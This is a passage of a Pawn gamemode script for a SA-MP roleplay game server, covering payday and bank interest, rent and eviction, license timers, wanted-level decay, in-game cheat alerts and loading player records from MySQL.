            format(string,sizeof(string),"Odometer: %.2f Km", PlayerInfo[MashinOwner_2[veh]][cKilo_2]);
            TextDrawSetString(KiloTextDraw[i], string);
        }
    }
    return 1;
}
public SyncUp()
{
    new string[256];
    for(new j = 0; j<LastPID; j++)
    {
        if(IsPlayerConnected(j))
        {
            if(GetPlayerPool(j) < 0)
            {
                if(MoneyMessage[j]==0)
                {
                    format(string, sizeof(string), "You are in debt, you have till next Time Check to get: $%d or you go to jail.", GetPlayerPool(j));
                    SendClientMessage(j, COLOR_LIGHTRED, string);
                    MoneyMessage[j] = 1;
                }
            }
            else
            {
                MoneyMessage[j] = 0;
            }
        }
    }
    KamKonAzMinuteGetHit();
    SyncTime();
    DollahScoreUpdate();
}
KamKonAzMinuteGetHit()
{
    mysql_function_query(handle,"SELECT * FROM `users` WHERE pGetHitTime>='1'",true,"KamKOONAZMINGETHIT","");
    return 1;
}
Public:KamKOONAZMINGETHIT()
{
    new Name[40];
    for(new i = 0;i<cache_get_row_count(handle);i++)
    {
        cache_get_row(i,0,Name,handle,40);

        new id = ReturnUser2(Name);
        if(!IsPlayerConnected(id))
        {
            new query[256];
            format(query,256,"UPDATE `users` SET pGetHitTime=pGetHitTime-'1' WHERE pName='%s' AND pGetHitTime>='1'",Name[i]);
            mysql_function_query(handle,query,false,"SendQuery","");
        }
        else
        {
            PINFO[id][pGetHitTime] --;
            SaveKonVal(id, "pGetHitTime", PINFO[id][pGetHitTime]);
        }
    }
    return 1;
}
public SyncTime()
{
    new string[64],tmphour,tmpminute,tmpsecond;
    gettime(tmphour, tmpminute, tmpsecond);
    FixHour(tmphour);
    tmphour = shifthour;
    if ((tmphour > ghour) || (tmphour == 0 && ghour == 23))
    {
        ghour = tmphour;
        PayDay();
        if(tmphour == 19 || tmphour == 20 || tmphour == 21)
        {
		    for(new i = 0; i < LastPID; i++)
		    {
		        if(IsPlayerConnected(i))
		        {
					PINFO[i][pExp] += 1;
					SaveKonVal(i, "pExp", PINFO[i][pExp]);
					SendClientMessage(i,COLOR_LIGHTRED, "Shoma 1 Respect Ezafe Daryaft Kardid.");
				}
			}
		}
        if(tmphour == 20)
        {
			format(string, sizeof(string), "Lottery News: We have started the Lottery Election.");
			OOCOff(COLOR_DBLUE, string);
			new rand = random(80);
			Lotto(rand);
        }
		SetWorldTime(tmphour);
    }
}

public SaveAccounts()
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            ReadAccountBar();
        }
    }
    for(new i = 0;i<sizeof BizzInfo;i++)
    {
        OnBizUpdate(i);
    }
    for(new i = 0;i<sizeof SBizzInfo;i++)
    {
        OnSbizUpdate(i);
    }
}

public IsPlayerInTurf(playerid, turfid)
{
    if(IsPlayerConnected(playerid))
    {
        if(turfid == -1)
        {
            return 0;
        }
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid,x,y,z);
        if(x >= TurfInfo[turfid][zMinX] && x < TurfInfo[turfid][zMaxX] && y >= TurfInfo[turfid][zMinY] && y < TurfInfo[turfid][zMaxY])
        {
            return 1;
        }
    }
    return 0;
}

public GetClosestPlayer(p1)
{
    new x,Float:dis,Float:dis2,player;
    player = -1;
    dis = 99999.99;
    for (x=0;x<MAX_PLAYERS;x++)
    {
        if(IsPlayerConnected(x))
        {
            if(x != p1)
            {
                dis2 = GetDistanceBetweenPlayers(x,p1);
                if(dis2 < dis && dis2 != -1.00)
                {
                    dis = dis2;
                    player = x;
                }
            }
        }
    }
    return player;
}

Public:WantedKamKon(playerid)
{
    for(new b;b<LastPID;b++)
    {
        if(IsPlayerConnected(b))
        {
            if(gTeam[b] == TEAM_COP)
            {
                if(ProxDetectorS(80,playerid,b)) {WantedKamKonTimer[playerid] = SetTimerEx("WantedKamKon",2700000,0,"i",playerid); WantedKamKonTimerValid[playerid] = true; return 0;}
            }
        }
    }
    if(GetPlayerWantedLevel(playerid) >= 1)
    {
        SetPlayerWantedLevel(playerid,GetPlayerWantedLevel(playerid)-1);
        new points = GetPlayerWantedLevel(playerid);
        new wlevel;
        if(points > 0)
        {
            new yesno;
            if(points >= 1 && points <= 6) { WantedLevel[playerid] = points; wlevel = points; yesno = 1; }
            if(yesno)
            {
                new string[256];
                SCM(playerid,COLOR_LIGHTRED,"Wanted -1, reason: cops lost your track.");
                format(string, sizeof(string), "Current Wanted Level: %d", wlevel);
                SendClientMessage(playerid, COLOR_YELLOW, string);
                SetPlayerWantedLevel(playerid,wlevel);
                if(GetPlayerWantedLevel(playerid) >= 1) {WantedKamKonTimer[playerid] = SetTimerEx("WantedKamKon",2700000,0,"i",playerid); WantedKamKonTimerValid[playerid] = true;}
            }
        }
    }
    return 1;
}
public PayDay()
{
    new string[128];
    new account,interest;
    new rent = 0;
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pLevel] >= 0)
            {
                if(MoneyMessage[i]==1)
                {
                    SendClientMessage(i, COLOR_LIGHTRED, "You failed to pay your debt, Jail time.");
                    GameTextForPlayer(i, "~r~Busted!", 2000, 1);
                    SetPlayerWantedLevel(i,0);
                    PlayerInfo[i][pJailTime] = 240;
                    SaveKonVal(i, "pJailTime", 240);
                    SpawnPlayer(i);
                    format(string, sizeof(string), "You are jailed for %d seconds.", PlayerInfo[i][pJailTime]);
                    SendClientMessage(i, COLOR_LIGHTRED, string);
                }
                new playername2[MAX_PLAYER_NAME];
                GetPlayerName(i, playername2, sizeof(playername2));
                account = PlayerInfo[i][pAccount];
                new key = PlayerInfo[i][pPhousekey];
                if(key != 9999)
                {
                    new bool:nadarein;
                    rent = HouseInfo[key][hRent];
                    if(strcmp(playername2, HouseInfo[key][hOwner], true) == 0)
                    {
                        rent = 0;
                    }
                    else if(rent > PINFO[i][pAccount])
                    {
                        PlayerInfo[i][pPhousekey] = 9999;
                        SaveKonVal(i, "pPhousekey", 9999);
                        SendClientMessage(i, COLOR_RED, "You have been evicted.");
                        rent = 0;
                        if(PINFO[i][gParked] == 1)
                        {
                            CreateVehGarage(i);
                            SCM(i,COLOR_Good,"Your first car have been evicted from the parking.");
                        }
                        if(PINFO[i][gParked_2] == 1)
                        {
                            CreateVehGarage_2(i);
                            SCM(i,COLOR_Good,"Your first car have been evicted from the parking.");
                        }
                        RemovePlayerMapIcon(i, 30);
                        nadarein = true;
                    }
                    HouseInfo[key][hTakings] = HouseInfo[key][hTakings]+rent;
                    SaveKonValH(key, "hTakings", HouseInfo[key][hTakings]);
                    if(nadarein == false) {PINFO[i][pAccount] -= rent; SaveKonVal(i, "pAccount", PINFO[i][pAccount]);}
                }
                new tmpintrate;
                if(PlayerInfo[i][pPremiumAccount] > 0) { tmpintrate = 2; }
                else { tmpintrate = 1; }
                if(MyPayMin[i] >= 1)
                {
                    if(PINFO[i][pLevel] >= 8)
                    {
                        PlayerInfo[i][pAccount] -= Tax;
                        SaveKonVal(i, "pAccount", PINFO[i][pAccount]);
                        TaxValue += Tax;
                        SaveStuff();
                    }
                    new Float:checks2 = PlayerInfo[i][pPayCheck] / 5.0;
                    new checks = floatround(checks2);
                    GivePlayerPool(i, checks);
                    interest = (PlayerInfo[i][pAccount]/1000)*(tmpintrate);
                    PlayerPlayMusic(i);
                    PlayerInfo[i][pAccount] = account+interest;
                    SaveKonVal(i, "pAccount", PINFO[i][pAccount]);
                    new nxtlevel = PlayerInfo[i][pLevel]+1;
                    new expamount = nxtlevel*levelexp;
                    new taxMayoor;
                    if(PINFO[i][pLevel] >= 8)
                    {
                    taxMayoor = Tax;
                    }
                    else
                    {
                    taxMayoor = 0;
                    }
                    new lastbalance = account + taxMayoor + rent;
                    GameTextForPlayer(i, "~w~Payday~n~~y~PayCheck", 5000, 1);
                    SendClientMessage(i, COLOR_WHITE, "|_____ Sorat Hesab Bank _____|");
                    format(string, sizeof(string), "  Paycheck: $%s Maliat: -$%s Ejare: -$%s", FormatNumber(checks),FormatNumber(taxMayoor), FormatNumber(rent));
                    SendClientMessage(i, COLOR_GRAD2, string);
                    format(string, sizeof(string), "  Balance: $%s", FormatNumber(lastbalance));
                    SendClientMessage(i, COLOR_GRAD2, string);
                    format(string, sizeof(string), "  Interest Rate: 0.%d percent",tmpintrate);
                    SendClientMessage(i, COLOR_GRAD2, string);
                    format(string, sizeof(string), "  Interest Gained $%s", FormatNumber(interest));
                    SendClientMessage(i, COLOR_GRAD2, string);
                    SendClientMessage(i, COLOR_WHITE, "|-------------------------------------|");
                    format(string, sizeof(string), "  New Balance: $%s", FormatNumber(PlayerInfo[i][pAccount]));
                    SendClientMessage(i, COLOR_GRAD2, string);

                    new saat,daqiqe,sanie;
                    gettime(saat,daqiqe,sanie);
                    PlayerInfo[i][pExp]++;
                    SaveKonVal(i, "pExp", PINFO[i][pExp]);
                    new nxttlevel = PlayerInfo[i][pLevel]+1;
                    new expamountt = nxttlevel*levelexp;
                    if(PINFO[i][pExp] == expamount)
                    {
                        new ajabzstr[256];
                        format(ajabzstr, 256, "You earn a respect and your respect it's %i/%i now, you can now type /buylevel.", PINFO[i][pExp], expamountt);
                        SCM(i, COLOR_Good, ajabzstr);
                    }
                    rent = 0;
                    PlayerInfo[i][pPayCheck] = 0;
                    if(AFK[i] == 0)
                    {
                        PlayerInfo[i][pConnectTime] += 1;
                        SaveKonVal(i, "pConnectTime", PINFO[i][pConnectTime]);
                    }
                    if(AFK[i] == 1)
                    {
                        PlayerInfo[i][pAFKtime] += 1;
                        SaveKonVal(i, "pAFKtime", PINFO[i][pAFKtime]);
                    }
                    if(PlayerInfo[i][pRob] != 20)
                    {
                        PlayerInfo[i][pRob] += 1;
                        SaveKonVal(i, "pRob", PINFO[i][pRob]);
                    }
                    if(PINFO[i][pCarLic] >= 1)
                    {
                    PINFO[i][pCarLic] --;
                    SaveKonVal(i, "pCarLic", PINFO[i][pCarLic]);
                    }
                    if(PINFO[i][pFlyLic] >= 1)
                    {
                    PINFO[i][pFlyLic] --;
                    SaveKonVal(i, "pFlyLic", PINFO[i][pFlyLic]);
                    }
                    if(PINFO[i][pBoatLic] >= 1)
                    {
                    PINFO[i][pBoatLic] --;
                    SaveKonVal(i, "pBoatLic", PINFO[i][pBoatLic]);
                    }
                    if(PINFO[i][pFishLic] >= 1)
                    {
                    PINFO[i][pFishLic] --;
                    SaveKonVal(i, "pFishLic", PINFO[i][pFishLic]);
                    }
                    if(PINFO[i][pGunLic] >= 1)
                    {
                    PINFO[i][pGunLic] --;
                    SaveKonVal(i, "pGunLic", PINFO[i][pGunLic]);
                    }
                    if(PINFO[i][pMatsLic] >= 1)
                    {
                    PINFO[i][pMatsLic] --;
                    SaveKonVal(i, "pMatsLic", PINFO[i][pMatsLic]);
                    }
                    if(gTeam[i] == TEAM_COP)
                    {
                        if(PlayerInfo[i][pRank] >= 3)
                        {
                            if(PlayerInfo[i][pLawyerPoint] != 20)
                            {
                                PlayerInfo[i][pLawyerPoint] += 1;
                                SaveKonVal(i, "pLawyerPoint", PINFO[i][pLawyerPoint]);
                            }
                        }
                    }
                    if(PlayerInfo[i][pMember] == 16 || PlayerInfo[i][pLeader] == 16)
                    {
                        PlayerInfo[i][pTow] += 5;
                        SaveKonVal(i, "pTow", PINFO[i][pTow]);
                    }
                    if(PlayerInfo[i][pCarLicS] > 0)
                    {
                        PlayerInfo[i][pCarLicS]--;
                        SaveKonVal(i, "pCarLicS", PINFO[i][pCarLicS]);
                        if (PlayerInfo[i][pCarLicS] <= 0)
                        {
                            PlayerInfo[i][pCarLicS] = 0;
                            SaveKonVal(i, "pCarLicS", 0);
                            SendClientMessage(i, COLOR_WHITE, "Your driving license has been re-issued. Try to be a better citizen.");
                        }
                        else
                        {
                            format(string, sizeof(string), "Your driving license is suspended for %d more Hours.",PlayerInfo[i][pCarLicS]);
                            SendClientMessage(i, COLOR_YELLOW2, string);
                        }
                    }
                    if(PlayerInfo[i][pFlyLicS] > 0)
                    {
                        PlayerInfo[i][pFlyLicS]--;
                        SaveKonVal(i, "pFlyLicS", PINFO[i][pFlyLicS]);
                        if (PlayerInfo[i][pFlyLicS] <= 0)
                        {
                            PlayerInfo[i][pFlyLicS] = 0;
                            SaveKonVal(i, "pFlyLicS", PINFO[i][pFlyLicS]);
                            SendClientMessage(i, COLOR_WHITE, "Your flying license has been re-issued. Try to be a better citizen.");
                        }
                        else
                        {
                            format(string, sizeof(string), "Your flying license is suspended for %d more Hours.",PlayerInfo[i][pFlyLicS]);
                            SendClientMessage(i, COLOR_YELLOW2, string);
                        }
                    }
                    if(PlayerInfo[i][pBoatLicS] > 0)
                    {
                        PlayerInfo[i][pBoatLicS]--;
                        SaveKonVal(i, "pBoatLicS", PINFO[i][pBoatLicS]);
                        if (PlayerInfo[i][pBoatLicS] <= 0)
                        {
                            PlayerInfo[i][pBoatLicS] = 0;
                            SaveKonVal(i, "pBoatLicS", PINFO[i][pBoatLicS]);
                            SendClientMessage(i, COLOR_WHITE, "Your boating license has been re-issued. Try to be a better citizen.");
                        }
                        else
                        {
                            format(string, sizeof(string), "Your boating license is suspended for %d more Hours.",PlayerInfo[i][pBoatLicS]);
                            SendClientMessage(i, COLOR_YELLOW, string);
                        }
                    }
                    if(PlayerInfo[i][pGunLicS] > 0)
                    {
                        PlayerInfo[i][pGunLicS]--;
                        SaveKonVal(i, "pGunLicS", PINFO[i][pGunLicS]);
                        if (PlayerInfo[i][pGunLicS] <= 0)
                        {
                            PlayerInfo[i][pGunLicS] = 0;
                            SaveKonVal(i, "pGunLicS", PINFO[i][pGunLicS]);
                            SendClientMessage(i, COLOR_WHITE, "Your weapons license has been re-issued. Try to be a better citizen.");
                        }
                        else
                        {
                            format(string, sizeof(string), "Your weapons license is suspended for %d more Hours.",PlayerInfo[i][pGunLicS]);
                            SendClientMessage(i, COLOR_YELLOW, string);
                        }
                    }
                    if(PlayerInfo[i][pMatsLicS] > 0)
                    {
                        PlayerInfo[i][pMatsLicS]--;
                        SaveKonVal(i, "pMatsLicS", PINFO[i][pMatsLicS]);
                        if (PlayerInfo[i][pMatsLicS] <= 0)
                        {
                            PlayerInfo[i][pMatsLicS] = 0;
                            SaveKonVal(i, "pMatsLicS", PINFO[i][pMatsLicS]);
                            SendClientMessage(i, COLOR_WHITE, "Your materials license has been re-issued. Try to be a better citizen.");
                        }
                        else
                        {
                            format(string, sizeof(string), "Your materials license is suspended for %d more Hours.",PlayerInfo[i][pMatsLicS]);
                            SendClientMessage(i, COLOR_YELLOW, string);
                        }
                    }
                    if(PlayerInfo[i][pPremiumAccount] > 0)
                    {
                        PlayerInfo[i][pPayDayHad] += 1;
                        SaveKonVal(i, "pPayDayHad", PINFO[i][pPayDayHad]);
                        if(PlayerInfo[i][pPayDayHad] >= 4)
                        {
                            PlayerInfo[i][pExp]++;
                            SaveKonVal(i, "pExp", PINFO[i][pExp]);
                            PlayerInfo[i][pPayDayHad] = 0;
                            SaveKonVal(i, "pPayDayHad", 0);
                            SCM(i,COLOR_ROUZ,"You've been taken 1 respect point as prize.");
                            if(PINFO[i][pExp] == expamountt)
                            {
                                new ajabzstr[256];
                                format(ajabzstr, 256, "You earn a respect and your respect it's %i/%i now, you can now type /buylevel.", PINFO[i][pExp], expamountt);
                                SCM(i, COLOR_Good, ajabzstr);
                            }
                        }
                    }
                    if(PlayerInfo[i][pPunish] > 0)
                    {
                        PlayerInfo[i][pPunish] -= 1;
                        SaveKonVal(i, "pPunish", PINFO[i][pPunish]);
                    }
                    MyPayMin[i] = 0;
                }
                else
                {
                    SendClientMessage(i, COLOR_LIGHTRED, "** You haven't played long enough to obtain a PayDay.");
                }
            }
        }
    }
    SaveAccounts();
    return 1;
}
forward Paymec(playerid);
public Paymec(playerid)
{
    MyPayMin[playerid] += 1;
    return 1;
}
/*NumberBoodan(const string[])//By eblis
{
    for(new i;i<strlen(string);i++)
    {
        if(string[i] < '0' || string[i] > '9' || string[i] < '0' || string[i] > '9') return 0;
    }
    return 1;
}*/
ReturnUser2(string[])//By Hamid
{
    new ID = INVALID_PLAYER_ID;
     for(new i = 0; i < Akharish; i++)
    {
        if(IsPlayerConnected(i))
        {

            if(!strcmp(PlayerInfo[i][pName],string,true)) ID = i;
        }
    }
    return ID;
}
ReturnUserEx(string[])//By eblis
{
    new Name[MAX_PLAYER_NAME],ID = INVALID_PLAYER_ID;
    for(new i;i<LastPID;i++)
    {
        if(IsPlayerConnected(i))
        {
            GetPlayerName(i, Name, MAX_PLAYER_NAME);
            if(!strcmp(Name,string,true)) ID = i;
        }
    }
    return ID;
}
strtokEx(const cmdtext[],idx)//By eblis
{
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[145];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            return result;
}

strtok(const string[], &index)
{
    new length = strlen(string);
    while ((index < length) && (string[index] <= ' '))
    {
        index++;
    }

    new offset = index;
    new result[145];
    while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
    {
        result[index - offset] = string[index];
        index++;
    }
    result[index - offset] = EOS;
    return result;
}
strtokLoL(const cmdtext[],idx)
{
    new length = strlen(cmdtext);
    while ((idx < length) && (cmdtext[idx] <= ' '))
    {
        idx++;
    }
            new offset = idx;
            new result[145];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            return result;
}

public OnPlayerRegister(playerid)
{
	ShowPlayerDialog(playerid,12346,DIALOG_STYLE_PASSWORD,"Account Login","Account registered, you can login now by typing your password below.\n","Login","Quit");
	PlayerInfo[playerid][pTut] = 0;
	SaveKonVal(playerid, "pTut", 0);
	UpdateAkharAcc(playerid);
    return 1;
}
public OnPlayerUpdate(playerid)
{
    if(GetPlayerWeapon(playerid) == 9 || GetPlayerWeapon(playerid) == 16 || GetPlayerWeapon(playerid) == 18 || GetPlayerWeapon(playerid) == 35 || GetPlayerWeapon(playerid) == 36 || GetPlayerWeapon(playerid) == 37 || GetPlayerWeapon(playerid) == 38 || GetPlayerWeapon(playerid) == 39 ) //Put here the IDs of weapons you want, I'll post link after pawn.
        {
      if(PlayerInfo[playerid][pAdmin] < 1)
      {
                   ResetPlayerWeapons(playerid);
           return 1;
        }
    }
   
    if(!IsPlayerInRangeOfPoint(playerid,3.0,2316.1487,-7.2585,26.7422)) {IsPlayerBankCheckpoint[playerid] = false; if(CP[playerid] == 512512) {DisablePlayerCheckpoint(playerid); CP[playerid] = 0;OnCheckpoint[playerid] = 0;}}
    	if(IsPlayerInRangeOfPoint(playerid,3.0,2316.1487,-7.2585,26.7422) && IsPlayerBankCheckpoint[playerid] == false)
	{
	    if(IsPlayerBankCheckpoint[playerid] != true) {
        DisablePlayerCheckpoint(playerid);
        SetPlayerCheckpoint(playerid,2316.1487,-7.2585,26.7422,1.6);
        CP[playerid] = 512512;
        OnCheckpoint[playerid] = 1;
        IsPlayerBankCheckpoint = true;
        }
	}

	if(IsAtTelePhoneSabet[playerid] == true)
	{
         if(!IsPlayerInRangeOfPoint(playerid,4.0,1808.0897,-1599.5748,13.5469))
		 {
			OnPlayerCommandText(playerid, "/h");
			IsAtTelePhoneSabet[playerid] = false;
			return SCM(playerid,-1,"Az Tele Phone Sabet Dor Shodid Va Tamas Ghat Shod");
		 }
	}
	if(OnMashinKharidan[playerid] == 1 && InModShop[playerid] == 0) {
	SetPlayerCameraPos(playerid, -1958.9172, 257.9527, 38.7022);
	SetPlayerCameraLookAt(playerid, -1957.9890, 258.3209, 38.2272);
	}

	if(SafeOn == 1 && mpop[playerid] != 5566 && PlayerToPoint(80.0, playerid, 1361.2560,-1034.9871,26.1406)) {
	TextDrawShowForPlayer(playerid, SafeZone[playerid])
	SafeZoneCheck[playerid] = 1;
TextDrawLetterSize(SafeZone[playerid], 0.555499, 2.066665);
TextDrawAlignment(SafeZone[playerid], 1);
TextDrawColor(SafeZone[playerid], 0x54cd3bFF );
TextDrawSetShadow(SafeZone[playerid], 0);
TextDrawSetOutline(SafeZone[playerid], 1);
TextDrawBackgroundColor(SafeZone[playerid], 255);
TextDrawFont(SafeZone[playerid], 2);
TextDrawSetProportional(SafeZone[playerid], 1);
	}
	else if(SafeOn == 1 && mpop[playerid] != 5566 && PlayerToPoint(80.0, playerid, 1459.289428,-1033.327148,24.987575)) {
	TextDrawShowForPlayer(playerid, SafeZone[playerid])
	SafeZoneCheck[playerid] = 1;
TextDrawLetterSize(SafeZone[playerid], 0.555499, 2.066665);
TextDrawAlignment(SafeZone[playerid], 1);
TextDrawColor(SafeZone[playerid], 0x54cd3bFF );
TextDrawSetShadow(SafeZone[playerid], 0);
TextDrawSetOutline(SafeZone[playerid], 1);
TextDrawBackgroundColor(SafeZone[playerid], 255);
TextDrawFont(SafeZone[playerid], 2);
TextDrawSetProportional(SafeZone[playerid], 1);
	}
	else {
	TextDrawHideForPlayer(playerid, SafeZone[playerid])
	SafeZoneCheck[playerid] = 0;
	}


	if(GetPlayerWantedLevel(playerid) > 0) {
	new string[512];
	new wanted = GetPlayerWantedLevel(playerid);
	format(string, sizeof(string), "Wanted {f42e0c}%d",wanted);
	SetPlayerChatBubble(playerid, string, COLOR_LIGHTRED, 30.0, 60000);
	}
	else if(GetPlayerWantedLevel(playerid) == 0) {
	new string[512];
	new wanted = GetPlayerWantedLevel(playerid);
	format(string, sizeof(string), "Wanted %d",wanted);
	//format(string, sizeof(string), "%d",);
 	if(Bio[playerid] == true){
	SetPlayerChatBubble(playerid,PlayerInfo[playerid][pBio], COLOR_TCC, 30.0, 1000);
	}
	}


    new kk, ud, lr;
    GetPlayerKeys(playerid, kk, ud, lr);
    #pragma unused kk
    if(ud < 0 || ud > 0) AFKTime[playerid] = 0;
    if(lr < 0 || lr > 0) AFKTime[playerid] = 0;
    CheckSpecing(playerid);
    new VehicleID = GetPlayerVehicleID(playerid);
    if (MaxSorat[VehicleID] != 0 && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
    {

        if ( VehicleID )
        {
            static
                /*Float:s_fX,
                Float:s_fY,
                Float:s_fZ,*/
                Float:s_fVX,
                Float:s_fVY,
                Float:possx,Float:possy,Float:possz,
                Float:s_fVZ
            ;

            //GetVehiclePos( VehicleID, s_fX, s_fY, s_fZ );
            GetVehicleVelocity( VehicleID, s_fVX, s_fVY, s_fVZ );

            //if ( !IsPlayerInRangeOfPoint( playerid, VehicleSpeedLimit[ VehicleID ] + 0.05, s_fX + s_fVX, s_fY + s_fVY, s_fZ + s_fVZ ) )
            if(soratbegirs(VehicleID) >= MaxSorat[VehicleID])
            {
                static
                    Float:s_fLength
                ;

                s_fLength = floatsqroot( ( s_fVX * s_fVX ) + ( s_fVY * s_fVY ) + ( s_fVZ * s_fVZ ) );

                s_fVX = ( s_fVX / s_fLength ) * (MaxSorat[VehicleID]/220.0);
                s_fVY = ( s_fVY / s_fLength ) * (MaxSorat[VehicleID]/220.0);
                GetVehicleVelocity( VehicleID , possx , possy , possz);
                SetVehicleVelocity( VehicleID, s_fVX, s_fVY, possz);
            }
        }
    }
    return 1;
}

public OnCheatDetected(playerid, ip_address[], type, code) {

	if(code == 6 || code == 13 || code == 14 || code == 15 || code == 16 || code == 19 || code == 20 || code == 24 || code == 27 || code == 36 || code == 37 || code == 38 || code == 39 || code == 40 || code == 41 || code == 45 || code == 46 || code == 48 || code == 52) return 1;
	if(OnMashinKharidan[playerid] == 1 && (code == 4 || code == 50)) return 1;
	if(GodmodeFeature[playerid] == true && (code == 11 || code == 12 || code == 19 || code == 20)) return 1;
	if((code == 2 || code == 21) && mpop[playerid] != 5566) return 1;
	if(EnableBoast[playerid] == 0 && code == 10) return 1;
	if(Raft[playerid] != 0 && code == 5) return 1;
	new string[512];
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}Server detected a(n) %s on {57e547}%s(%d). ",CheatName[code],name,playerid);
	ABroadCast(COLOR_AdminWarn,string,1);
	SetTimerEx("detectfree", 10000, false, "ii", playerid,code)
    return 1;
}


public OnPlayerLogin(playerid)
{
    if(IsPlayerConnected(playerid))
    {
		new playername2[40];
        GetPlayerName(playerid,playername2,40)
        PlayerInfo[playerid][pReg] = cache_get_row_int(0,7,handle);
        if(PlayerInfo[playerid][pReg] == 1) {PINFO[playerid][pID] = cache_get_row_int(0,120,handle);}
        PlayerInfo[playerid][pLevel] = cache_get_row_int(0,2,handle),
        PlayerInfo[playerid][pAdmin] = cache_get_row_int(0,3,handle),
        PlayerInfo[playerid][pPremiumAccount] = cache_get_row_int(0,4,handle),
        PlayerInfo[playerid][pConnectTime] = cache_get_row_int(0,5,handle),
        PlayerInfo[playerid][pAFKtime] = cache_get_row_int(0,6,handle);
        if(PlayerInfo[playerid][pReg] == 1) {cache_get_row(0,8,PlayerInfo[playerid][pRegistredDate],handle,24);}
        if(PlayerInfo[playerid][pReg] == 1) {cache_get_row(0,9,PlayerInfo[playerid][pLastLogin],handle,64);}
        PlayerInfo[playerid][pSex] = cache_get_row_int(0,10,handle),
        PlayerInfo[playerid][pRented] = cache_get_row_int(0,11,handle),
        PlayerInfo[playerid][pMuteTime] = cache_get_row_int(0,12,handle);
        PlayerInfo[playerid][pExp] = cache_get_row_int(0,13,handle),
        PlayerInfo[playerid][pCash] = cache_get_row_int(0,14,handle),
        PlayerInfo[playerid][pAccount] = cache_get_row_int(0,15,handle),
        PlayerInfo[playerid][pCrimes] = cache_get_row_int(0,16,handle),
        PlayerInfo[playerid][pKills] = cache_get_row_int(0,17,handle),
        PlayerInfo[playerid][pDeaths] = cache_get_row_int(0,18,handle),
        PlayerInfo[playerid][pArrested] = cache_get_row_int(0,19,handle),
        PlayerInfo[playerid][pWantedDeaths] = cache_get_row_int(0,20,handle),
        PlayerInfo[playerid][pPhoneBook] = cache_get_row_int(0,21,handle);
        PlayerInfo[playerid][pLottoNr] = cache_get_row_int(0,22,handle),
        PlayerInfo[playerid][pFishes] = cache_get_row_int(0,23,handle),
        PlayerInfo[playerid][pJob] = cache_get_row_int(0,24,handle),
        PlayerInfo[playerid][pPayCheck] = cache_get_row_float(0,25,handle),
        PlayerInfo[playerid][pHeadValue] = cache_get_row_int(0,26,handle),
        PlayerInfo[playerid][pJailTime] = cache_get_row_int(0,27,handle),
        PlayerInfo[playerid][pMats] = cache_get_row_int(0,28,handle),
        PlayerInfo[playerid][pDrugs] = cache_get_row_int(0,29,handle);
        PlayerInfo[playerid][pLeader] = cache_get_row_int(0,30,handle),
        PlayerInfo[playerid][pTow] = cache_get_row_int(0,31,handle),
        PlayerInfo[playerid][pMember] = cache_get_row_int(0,32,handle),
        PlayerInfo[playerid][pPunish] = cache_get_row_int(0,33,handle),
        PlayerInfo[playerid][pFwarn] = cache_get_row_int(0,34,handle),
        PlayerInfo[playerid][pRank] = cache_get_row_int(0,35,handle),
        PlayerInfo[playerid][cSkin] = cache_get_row_int(0,36,handle),
        PlayerInfo[playerid][fSkin] = cache_get_row_int(0,37,handle),
        PlayerInfo[playerid][pWalkieTalkie] = cache_get_row_int(0,38,handle),
        PlayerInfo[playerid][pDetSkill] = cache_get_row_int(0,39,handle);
        PlayerInfo[playerid][pLawSkill] = cache_get_row_int(0,40,handle),
        PlayerInfo[playerid][pMechSkill] = cache_get_row_int(0,41,handle),
        PlayerInfo[playerid][pJackSkill] = cache_get_row_int(0,42,handle),
        PlayerInfo[playerid][pNewsSkill] = cache_get_row_int(0,43,handle),
        PlayerInfo[playerid][pDrugsSkill] = cache_get_row_int(0,44,handle),
        PlayerInfo[playerid][pMatsSkill] = cache_get_row_int(0,45,handle),
        PlayerInfo[playerid][pTeam] = cache_get_row_int(0,46,handle),
        PlayerInfo[playerid][pPnumber] = cache_get_row_int(0,47,handle),
        PlayerInfo[playerid][pPhousekey] = cache_get_row_int(0,48,handle);
        PlayerInfo[playerid][pCar] = cache_get_row_int(0,49,handle);
        PlayerInfo[playerid][pRob] = cache_get_row_int(0,50,handle),
        PlayerInfo[playerid][pRobSkill] = cache_get_row_int(0,51,handle);
        if(PlayerInfo[playerid][pReg] == 1) {PlayerInfo[playerid][pPbiskey] = cache_get_row_int(0,52,handle);}
        PlayerInfo[playerid][pCarLic] = cache_get_row_int(0,53,handle),
        PlayerInfo[playerid][pFlyLic] = cache_get_row_int(0,54,handle),
        PlayerInfo[playerid][pBoatLic] = cache_get_row_int(0,55,handle);
        PlayerInfo[playerid][pFishLic] = cache_get_row_int(0,56,handle),
        PlayerInfo[playerid][pGunLic] = cache_get_row_int(0,57,handle),
        PlayerInfo[playerid][pMatsLic] = cache_get_row_int(0,58,handle),
        PlayerInfo[playerid][pCarLicS] = cache_get_row_int(0,59,handle),
        PlayerInfo[playerid][pFlyLicS] = cache_get_row_int(0,60,handle),
        PlayerInfo[playerid][pBoatLicS] = cache_get_row_int(0,61,handle),
        PlayerInfo[playerid][pGunLicS] = cache_get_row_int(0,62,handle),
        PlayerInfo[playerid][pMatsLicS] = cache_get_row_int(0,63,handle);
        PlayerInfo[playerid][pCarTime] = cache_get_row_int(0,64,handle);
        PlayerInfo[playerid][pPayDayHad] = cache_get_row_int(0,65,handle),
        PlayerInfo[playerid][pTut] = cache_get_row_int(0,66,handle),
        PlayerInfo[playerid][pWarns] = cache_get_row_int(0,67,handle),
        PlayerInfo[playerid][pCanistra] = cache_get_row_int(0,68,handle);
        if(PlayerInfo[playerid][pReg] == 1) {cache_get_row(0,69,PlayerInfo[playerid][pMarriedTo],handle,128);}
        PlayerInfo[playerid][pLighter] = cache_get_row_int(0,70,handle),
